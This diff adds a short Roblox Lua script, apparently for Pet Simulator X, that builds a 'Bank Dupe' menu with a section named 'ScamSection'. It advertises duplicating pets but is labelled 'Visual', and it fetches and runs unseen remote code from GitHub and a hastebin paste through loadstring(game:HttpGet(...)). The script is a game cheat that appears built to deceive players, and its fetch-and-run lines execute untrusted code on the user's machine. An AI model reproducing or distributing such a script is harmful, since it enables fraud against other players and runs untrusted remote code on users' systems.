@@ -1,0 +1,16 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/DevRlchksStudio/VisualPSX/main/HugeHellRockVisual",true))(); loadstring(game:HttpGet(('https://raw.githubusercontent.com/Justanotherdme/scripts/main/psxvisualpets.lua')))()
+local Window = Library.CreateLib("Bank Dupe", "DarkTheme")
+
+--Visual
+local Trade = Window:NewTab("HugeHellRock")
+local ScamSection = Trade:NewSection("Visual")
+
+
+ScamSection:NewToggle("Dupe", "Put Pet are bank and wait 1 day", function(state)
+    if state then
+        _G.Key = 538057555
+        loadstring(game:HttpGet("https://hastebin.app/raw/626c2b78d3810c001cf24b08"))()
+    else
+        print("Toggle Off")
+    end
+end)
